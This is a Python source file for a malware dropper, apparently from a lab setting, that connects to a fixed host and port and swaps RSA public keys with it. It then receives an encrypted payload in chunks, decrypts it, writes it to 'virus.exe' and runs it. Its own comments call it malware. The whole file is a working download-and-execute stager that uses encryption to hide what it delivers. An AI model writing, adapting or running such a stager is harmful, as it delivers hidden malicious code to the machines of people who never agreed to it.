from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import socket
from _thread import *
import subprocess

CYPHERTEXT_LENGTH = 256
HOST = "10.0.2.2"
PORT = 5555

class Cryptography:

    def __init__(self):
        self.keyPair = RSA.generate(2048)
        self.publicKeyPEM = self.keyPair.publickey().exportKey()
        self.manager = PKCS1_OAEP.new(self.keyPair)
    
    def decrypt(self,cyphertext):
        return self.manager.decrypt(cyphertext)

    def getPublicKey(self):
        return self.publicKeyPEM

def main():
    
    crypto = Cryptography()
    
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((HOST,PORT))
    
    # RECEIVE SERVER'S PK
    SERVER_PK = s.recv(1024)
    
    # SEND MALWARE'S PK
    s.send(crypto.getPublicKey())
    
    print("[CLIENT] Receiving payload...")
    
    # RECEIVE ENCRYPTED MESSAGE
    chunks = bytearray()
    
    while True:
        encryptedChunk = s.recv(CYPHERTEXT_LENGTH)
        chunks.extend(encryptedChunk)
        if not encryptedChunk:
            break
        
    print("[CLIENT] decrypting chunks...")
  
    PAYLOAD = bytearray()  
    begin = 0
    end = CYPHERTEXT_LENGTH
    for i in range(len(chunks)//CYPHERTEXT_LENGTH):        
        PAYLOAD.extend(crypto.decrypt(chunks[begin:end]))
        begin = end
        end = begin + CYPHERTEXT_LENGTH
        	    
    EXEC = open("virus.exe","wb")
    EXEC.write(PAYLOAD)
    EXEC.close()

    #EXECUTING THE PAYLOAD
    print("[CLIENT] executing payload...")
    subprocess.call(["virus.exe"])
    
    # CLOSING CONNECTION
    s.close()

if __name__ == "__main__":
    main()
